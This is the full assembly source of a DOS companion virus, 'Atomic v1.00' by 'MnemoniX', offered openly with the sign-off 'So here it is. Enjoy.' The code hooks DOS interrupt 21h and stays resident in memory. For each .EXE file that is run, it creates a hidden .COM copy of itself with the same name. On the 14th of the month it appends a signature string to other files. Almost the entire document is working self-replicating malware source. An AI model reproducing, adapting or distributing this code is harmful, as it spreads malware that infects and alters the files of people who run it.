comment $

			     è  Atomic v1.00  è

	     This virus is a spawning, resident infector of .EXE
	     programs. Upon execution, Atomic will stay resident 
	     in memory, and capture int 21h. Whenever it detects
	     an .EXE file being executed,  it will create a .COM
	     file with the virus in the same directory, with the 
	     same name.

	     If the user tries to run an infected .EXE file, the
	     .COM file is run first, installing itself in memory
	     and spreading it yet more. (The infected .EXE files
	     are not actually changed.)

	     On the 14th of the month,  the virus will affix its
	     signature to three non-EXE files that are opened or
	     executed. The signature is just a short string that
	     says "Atomix v1.00 by Mnemonix."

	     So here it is. Enjoy.

					MnemoniX

$
	     
_TEST_          equ     0FEEDh                  ; infection test 
_PASS_          equ     0DEADh
SIG_LENGTH      equ     31                      ; length of signature

code            segment
		assume  cs:code,ds:code   

		org   100h

start:          
		jmp  begin_virus       

result          dw      0
buffer          dw      0
signatures      db      3

old_int_21      dd      0

signature       db      ' ',15,' Atomic v1.00 ',15,'  by MnemoniX',0

exe_file        db      64 dup(?)
		
parm_block:
environment     dw      0
cmd_line        dw      80h                     ; cmd line offset
cmd_line_seg    dw      0                       ; cmd line seg
fcb_1           dd      0                       ; who cares about FCB's?
fcb_2           dd      0

; ======================================>
;  infecting routine (int 21 handler) 
; ======================================>

int_21:
	pushf
	call    dword ptr cs:[old_int_21]
	ret

new_int_21:
	sti
	cmp     ax,4B00h                        ; execute file?
	je      infect                          ; yes, try infecting

	cmp     ah,3Dh                          ; open file?
	je      infect                          ; same ....

	cmp     ax,_TEST_                       ; check for virus in memory?
	je      pass_signal                     ; yes, give pass signal
	jmp     quick_exit

pass_signal:
	mov     ax,_PASS_                       ; give passing signal
	iret                                    ; and get out

infect:
	push    ax
	push    bx
	push    cx
	push    dx
	push    di
	push    si
	push    ds
	push    es

	push    ds
	push    dx                              ; save file name
	mov     ax,3D02h                        ; open file
	call    int_21  
	jnc     read_file                       ; can't open; leave
	
	pop     dx 
	pop     ds
	jmp     quit
	
read_file:
	mov     bx,ax                           ; file handle in BX

	push    cs
	pop     ds
	mov     dx,offset buffer                ; get in 2 bytes
	mov     cx,2
	mov     ah,3Fh
	call    int_21  

	mov     ax,buffer
	cmp     ax,'ZM'                         ; .EXE file?
	je      infect_it                       ; yep; let's go
	pop     dx
	pop     ds
	
	mov     ah,2Ah                          ; if not an .EXE,
	int     21h                             ; check date; if 14th of
	cmp     dl,14                           ; month, we will add a sig
	je      sign                            ; to three files regardless
	jmp     close
	
sign:
	push    cs
	pop     ds                                   
	cmp     signatures,0                    ; if three sigs done already,
	jne     add_sig                         ; skip it
	jmp     close

add_sig:        
	dec     signatures
	mov     ax,4202h                        ; add sig to non-.EXE files
	xor     cx,cx                           ; on 14th of month
	xor     dx,dx
	int     21h
	
	mov     dx,offset signature
	mov     cx,SIG_LENGTH
	mov     ah,40h
	int     21h
	jmp     close

infect_it:
	pop     si                              ; get name of file
	pop     ds
	push    cs
	pop     es
	
	mov     di,offset exe_file
	mov     cx,64
	rep     movsb

	push    cs                              ; scan for period '.'
	pop     ds
	mov     si,offset exe_file

scan_name:
	lodsb
	cmp     al,'.'
	je      add_ext
	cmp     al,0                            ; no extension; close
	je      quit
	jmp     scan_name

add_ext:                                        ; add .COM extension
	mov     word ptr [si],'OC'
	mov     word ptr [si+2],'M'
	
	mov     ah,3Eh                          ; close .EXE file
	int     21h

	mov     dx,offset exe_file              ; now open file
	mov     ax,3D02h
	call    int_21  
	jnc     close                           ; if already there, skip it
	cmp     ax,02
	jne     quit                            ; can't open, leave

	mov     ah,3Ch                          ; create hidden .COM file
	mov     cx,2
	call    int_21  
	jc      quit                            ; can't open, quit
	mov     bx,ax

	mov     word ptr [si],'XE'              ; switch back to .EXE ext.
	mov     word ptr [si+2],'E'             

	mov     dx,start                        ; write virus to file
	mov     cx,VIRUS_LENGTH
	mov     ah,40h
	call    int_21   

close:  
	mov     ah,3Eh
	call    int_21  

quit:   
	pop     es                              ; etc.
	pop     ds
	pop     di
	pop     si
	pop     dx
	pop     cx
	pop     bx
	pop     ax

quick_exit:     
	jmp      dword ptr cs:[old_int_21]

; ===================================>
;  installation routine
; ===================================>

begin_virus:
	mov     ax,_TEST_                       ; test for infection
	int     21h
	mov     result,ax                       ; save for later
	
	push    cs
	pop     cmd_line_seg

	mov     dx,offset exe_file              ; run .EXE file
	mov     bx,offset parm_block
	mov     ax,4B00h
	int     21h

	mov     ax,result                       ; check for virus
	cmp     ax,_PASS_                       ; already resident?
	je      exit                            ; if not, don't reinstall
	
	cli                                     ; get old int 21
	push    es
	mov     ax,0
	mov     es,ax
	mov     ax,3521h
	int     21h                      
	mov     w [offset old_int_21],bx      
	mov     w [offset old_int_21+2],es    

	mov     ax,2521h
	mov     dx,offset new_int_21            ; set new int 21 
	int     21h

	mov     dx,PROGRAM + 100h               ; TSR call - install virus
	int     27h

exit:
	mov     ah,4Ch
	int     21h

PROGRAM:

VIRUS_LENGTH    equ     PROGRAM - start

	code    ends
	end     start
